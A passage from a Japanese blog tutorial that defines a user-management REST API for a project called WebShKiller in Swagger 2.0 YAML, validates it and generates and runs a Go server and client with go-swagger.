&lt;ul&gt;
  &lt;li&gt;サービスに登録されているユーザの一覧を取得する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET : /users/
    * USER_ID(integer)
    * USERNAME(strings)
    * EMAIL(strings)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;サービスにユーザを登録する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST : /users/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;サービスに登録されているユーザの値を修正する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PATCH : /users/{id}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;サービスに登録されているユーザを削除する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DELETE : /users/{id}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上記のような設計をswaggerで定義すると大体以下のようになると思う。&lt;/p&gt;

&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# this is wsk api written by swagger&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;swagger&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;2.0'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;WebShKiller API&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Connect WebShKiller client, control and jail&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1.0.0&quot;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# the domain of the service&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;wsk-control.openstack&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# array of all schemes that your API supports&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;schemes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# will be prefixed to all paths&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/v1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;produces&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;paths&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;/users&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;summary&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;get user list&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;The users endpoint returns user_id, user_name&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;User&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;responses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;An array of users&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;schema&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;array&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
              &lt;span class=&quot;s&quot;&gt;$ref&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#/definitions/User'&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Unexpected error&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;schema&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;$ref&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#/definitions/Error'&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;summary&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;create new user&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;create new user&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;parameters&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;query&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;username(string)&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;string&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;email&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;query&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;email(string)&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;string&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;User&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;responses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;An array of users&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;schema&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;array&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
              &lt;span class=&quot;s&quot;&gt;$ref&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#/definitions/User'&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Unexpected error&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;schema&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;$ref&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#/definitions/Error'&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/users/{user_id}&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;patch&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;summary&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;modify user information&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;modify user infomation&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;parameters&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;user_id&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;query&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;user_id(number)&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;number&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;query&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;username(string)&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;string&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;email&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;query&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;email(string)&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;string&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;User&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;responses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;An array of users&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;schema&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;array&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
              &lt;span class=&quot;s&quot;&gt;$ref&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#/definitions/User'&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Unexpected error&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;schema&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;$ref&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#/definitions/Error'&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;summary&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;delete user&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;delete user&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;parameters&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;user_id&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;query&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;user_id(number)&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;number&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;User&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;responses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;An array of users&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;schema&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;array&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
              &lt;span class=&quot;s&quot;&gt;$ref&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#/definitions/User'&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Unexpected error&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;schema&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;$ref&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#/definitions/Error'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;definitions&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;object&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;user_id&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;string&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Unique identifier representing a specific user.&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;string&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Username&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;string&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Username&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;object&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;integer&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;int32&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;string&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;string&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;適宜、ymlファイルを&lt;a href=&quot;http://editor.swagger.io/#/&quot;&gt;ONLINE
EDITOR&lt;/a&gt;や&lt;a href=&quot;http://petstore.swagger.io/&quot;&gt;swagger-ui&lt;/a&gt;に入力して、定義に問題がないかを確認する。もしくはgo-swaggerでswaggerの定義が正しいのかを確認することもできる。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ swagger validate _swagger.yml
The swagger spec at &quot;_swagger.yml&quot; is valid against swagger specification 2.0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;swaggergo&quot;&gt;swaggerからgo言語のコードを生成する&lt;/h1&gt;

&lt;p&gt;swagger generateのAオプションはpackage名に関わるために重要である。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mkdir -p $GOPATH/src/github.com/KosukeShimofuji/wskapi/
$ cd $GOPATH/src/github.com/KosukeShimofuji/wskapi/
$ swagger generate server -f https://raw.githubusercontent.com/KosukeShimofuji/WebSHKiller/master/_swagger.yml -A wskapi
$ swagger generate client -f https://raw.githubusercontent.com/KosukeShimofuji/WebSHKiller/master/_swagger.yml -A wskapi
$ tree
.
├── client
│   ├── user
│   │   ├── delete_users_user_id_parameters.go
│   │   ├── delete_users_user_id_responses.go
│   │   ├── get_users_parameters.go
│   │   ├── get_users_responses.go
│   │   ├── patch_users_user_id_parameters.go
│   │   ├── patch_users_user_id_responses.go
│   │   ├── post_users_parameters.go
│   │   ├── post_users_responses.go
│   │   └── user_client.go
│   └── web_sh_killer_client.go
├── cmd
│   └── web-sh-killer-server
│       └── main.go
├── models
│   ├── error.go
│   └── user.go
└── restapi
    ├── configure_web_sh_killer.go
    ├── doc.go
    ├── embedded_spec.go
    ├── operations
    │   ├── user
    │   │   ├── delete_users_user_id.go
    │   │   ├── delete_users_user_id_parameters.go
    │   │   ├── delete_users_user_id_responses.go
    │   │   ├── delete_users_user_id_urlbuilder.go
    │   │   ├── get_users.go
    │   │   ├── get_users_parameters.go
    │   │   ├── get_users_responses.go
    │   │   ├── get_users_urlbuilder.go
    │   │   ├── patch_users_user_id.go
    │   │   ├── patch_users_user_id_parameters.go
    │   │   ├── patch_users_user_id_responses.go
    │   │   ├── patch_users_user_id_urlbuilder.go
    │   │   ├── post_users.go
    │   │   ├── post_users_parameters.go
    │   │   ├── post_users_responses.go
    │   │   └── post_users_urlbuilder.go
    │   └── web_sh_killer_api.go
    └── server.go

8 directories, 34 files
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;restful-api-server&quot;&gt;restful-api-serverの起動&lt;/h1&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ go install github.com/KosukeShimofuji/wskapi/cmd/wskapi-server/
$ web-sh-killer-server 
2016/12/02 14:33:19 the required flags `--tls-certificate` and `--tls-key` were not specified
$ wskapi-server -h
Usage:
  wskapi-server [OPTIONS]

Connect WebShKiller client, control and jail

Application Options:
      --scheme=            the listeners to enable, this can be repeated and defaults to the schemes in the swagger spec
      --cleanup-timeout=   grace period for which to wait before shutting down the server (default: 10s)
      --max-header-size=   controls the maximum number of bytes the server will read parsing the request header's keys and values, including the request line. It does not limit the size of the request body. (default: 1MiB)
      --socket-path=       the unix socket to listen on (default: /var/run/wskapi.sock)
      --host=              the IP to listen on (default: localhost) [$HOST]
      --port=              the port to listen on for insecure connections, defaults to a random value [$PORT]
      --listen-limit=      limit the number of outstanding requests
      --keep-alive=        sets the TCP keep-alive timeouts on accepted connections. It prunes dead TCP connections ( e.g. closing laptop mid-download) (default: 3m)
